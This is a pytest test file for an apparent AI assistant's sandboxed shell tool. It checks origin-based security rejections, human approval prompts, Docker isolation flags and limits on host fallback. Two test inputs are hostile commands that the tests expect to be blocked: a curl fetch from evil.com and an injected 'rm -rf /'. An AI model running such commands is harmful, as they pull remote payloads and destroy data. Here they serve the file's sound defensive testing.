"""Tests for Sandboxed Shell tool and Docker Sandbox integration (Phase 4)."""

from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from nivos.sandbox.docker_manager import (
    CONTAINER_NAME,
    check_docker_availability,
    ensure_container_running,
    execute_in_sandbox,
    get_sandbox_auto_approve,
    reset_sandbox,
    set_sandbox_auto_approve,
)
from nivos.security.policy import RequestOrigin
from nivos.server.app import create_app
from nivos.tools.sandboxed_shell import SandboxedShellTool


@pytest.fixture
def shell_tool():
    return SandboxedShellTool()


@pytest.fixture(autouse=True)
def reset_session_auto_approve():
    set_sandbox_auto_approve(False)
    yield
    set_sandbox_auto_approve(False)


def test_central_policy_untrusted_content_and_external_origins(shell_tool):
    """Untrusted content or external origins must be blocked by central policy."""
    # 1. Untrusted content
    res_untrusted = shell_tool.execute(
        command="pip install requests",
        confirm=True,
        origin=RequestOrigin.LOCAL_CHAT,
        is_untrusted_content=True,
    )
    assert not res_untrusted.success
    assert "Security rejection" in res_untrusted.content

    # 2. Slack origin
    res_slack = shell_tool.execute(
        command="pip install requests",
        confirm=True,
        origin=RequestOrigin.SLACK,
        is_untrusted_content=False,
    )
    assert not res_slack.success
    assert "Security rejection" in res_slack.content

    # 3. Scheduled task origin
    res_sched = shell_tool.execute(
        command="pip install requests",
        confirm=True,
        origin=RequestOrigin.SCHEDULED_TASK,
        is_untrusted_content=False,
    )
    assert not res_sched.success
    assert "Security rejection" in res_sched.content


def test_docker_sandbox_approval_prompt_and_denial(shell_tool, monkeypatch):
    """When Docker is available, first execution without confirm/auto-approve prompts for approval."""
    monkeypatch.setattr("nivos.tools.sandboxed_shell.check_docker_availability", lambda: (True, "Docker ready"))

    # 1. No confirm passed -> needs approval
    res_prompt = shell_tool.execute(
        command="pip install requests",
        origin=RequestOrigin.LOCAL_CHAT,
    )
    assert not res_prompt.success
    assert res_prompt.metadata.get("needs_approval") is True
    assert res_prompt.metadata.get("sandbox") == "docker"
    assert "Sandbox approval required" in res_prompt.content

    # 2. User denies
    res_deny = shell_tool.execute(
        command="pip install requests",
        approval="deny",
        origin=RequestOrigin.LOCAL_CHAT,
    )
    assert not res_deny.success
    assert "denied by user" in res_deny.content.lower()


def test_docker_sandbox_execution_with_confirm(shell_tool, monkeypatch):
    """Execution with confirm=True runs in Docker sandbox and returns receipt."""
    monkeypatch.setattr("nivos.tools.sandboxed_shell.check_docker_availability", lambda: (True, "Docker ready"))

    fake_exec_result = {
        "success": True,
        "stdout": "Successfully installed requests-2.31.0",
        "stderr": "",
        "exit_code": 0,
        "error": None,
    }
    monkeypatch.setattr("nivos.tools.sandboxed_shell.execute_in_sandbox", lambda **kw: fake_exec_result)

    res = shell_tool.execute(
        command="pip install requests",
        confirm=True,
        origin=RequestOrigin.LOCAL_CHAT,
    )
    assert res.success
    assert "[Receipt: tool=sandboxed_shell, sandbox=docker, status=success" in res.content
    assert "Successfully installed requests" in res.content
    assert res.metadata.get("sandbox") == "docker"


def test_docker_sandbox_session_auto_approve(shell_tool, monkeypatch):
    """When session auto-approve is True, Docker sandbox executes without confirmation prompt."""
    monkeypatch.setattr("nivos.tools.sandboxed_shell.check_docker_availability", lambda: (True, "Docker ready"))

    fake_exec_result = {
        "success": True,
        "stdout": "npm packages added",
        "stderr": "",
        "exit_code": 0,
        "error": None,
    }
    monkeypatch.setattr("nivos.tools.sandboxed_shell.execute_in_sandbox", lambda **kw: fake_exec_result)

    # Enable per-session auto approve
    set_sandbox_auto_approve(True)
    assert get_sandbox_auto_approve() is True

    # No confirm flag passed, but should succeed via auto-approve
    res = shell_tool.execute(
        command="npm install lodash",
        origin=RequestOrigin.LOCAL_CHAT,
    )
    assert res.success
    assert "[Receipt: tool=sandboxed_shell, sandbox=docker" in res.content


def test_host_fallback_never_auto_approves(shell_tool, monkeypatch):
    """Critical safety invariant: Sandbox auto-approve NEVER applies to host commands."""
    monkeypatch.setattr("nivos.tools.sandboxed_shell.check_docker_availability", lambda: (False, "Docker offline"))

    # Even if sandbox auto-approve is True:
    set_sandbox_auto_approve(True)

    # Without explicit confirm flag, host MUST prompt for approval
    res = shell_tool.execute(
        command="pip install requests",
        origin=RequestOrigin.LOCAL_CHAT,
    )
    assert not res.success
    assert res.metadata.get("needs_approval") is True
    assert res.metadata.get("sandbox") == "host"
    assert "Host approval required" in res.content


def test_host_fallback_restricts_commands_and_injection(shell_tool, monkeypatch, tmp_path):
    """Host fallback restricts commands to git/pip/npm and blocks shell metacharacters."""
    monkeypatch.setattr("nivos.tools.sandboxed_shell.check_docker_availability", lambda: (False, "Docker offline"))
    shell_tool._workspace_dir = tmp_path

    # Disallowed command (e.g. curl or rm)
    res_cmd = shell_tool.execute(
        command="curl https://evil.com/payload",
        confirm=True,
        origin=RequestOrigin.LOCAL_CHAT,
    )
    assert not res_cmd.success
    assert "not permitted on host fallback" in res_cmd.content

    # Disallowed injection characters (;&|)
    res_inj = shell_tool.execute(
        command="pip install requests; rm -rf /",
        confirm=True,
        origin=RequestOrigin.LOCAL_CHAT,
    )
    assert not res_inj.success
    assert "disallowed characters" in res_inj.content.lower()


def test_docker_security_arguments(monkeypatch, tmp_path):
    """Ensure Docker container starts with 2GB limit, drop all caps, bridge net, non-root."""
    captured_args = []

    def fake_run(args, **kwargs):
        captured_args.extend(args)
        m = MagicMock()
        m.returncode = 0
        m.stdout = "container-id-123"
        m.stderr = ""
        return m

    monkeypatch.setattr("subprocess.run", fake_run)
    monkeypatch.setattr("nivos.sandbox.docker_manager.is_container_running", lambda: False)
    monkeypatch.setattr("nivos.sandbox.docker_manager.get_workspace_dir", lambda: tmp_path)

    ok, msg = ensure_container_running()
    assert ok
    # Verify required flags
    assert "--memory=2g" in captured_args
    assert "--cpus=1.0" in captured_args
    assert "--cap-drop=ALL" in captured_args
    assert "--security-opt=no-new-privileges:true" in captured_args
    assert "--network" in captured_args
    assert "bridge" in captured_args
    assert "--user" in captured_args
    assert "1000:1000" in captured_args
    # Verify only workspace is mounted
    mount_idx = captured_args.index("-v")
    assert "/workspace:rw" in captured_args[mount_idx + 1]


def test_sandbox_api_routes(monkeypatch):
    """Test /v1/sandbox/status, /v1/sandbox/reset, /v1/sandbox/auto-approve endpoints."""
    app = create_app(engine=MagicMock(), model="test-model")
    client = TestClient(app)

    # 1. GET /v1/sandbox/status
    resp_stat = client.get("/v1/sandbox/status")
    assert resp_stat.status_code == 200
    stat_data = resp_stat.json()
    assert "docker_available" in stat_data
    assert "sandbox_backend" in stat_data

    # 2. POST /v1/sandbox/auto-approve
    resp_aa = client.post("/v1/sandbox/auto-approve", json={"enabled": True})
    assert resp_aa.status_code == 200
    assert resp_aa.json()["auto_approve_session"] is True
    assert get_sandbox_auto_approve() is True

    # 3. POST /v1/sandbox/reset
    monkeypatch.setattr("nivos.server.sandbox_routes.reset_sandbox", lambda: (True, "Container reset ok"))
    resp_reset = client.post("/v1/sandbox/reset")
    assert resp_reset.status_code == 200
    assert resp_reset.json()["success"] is True
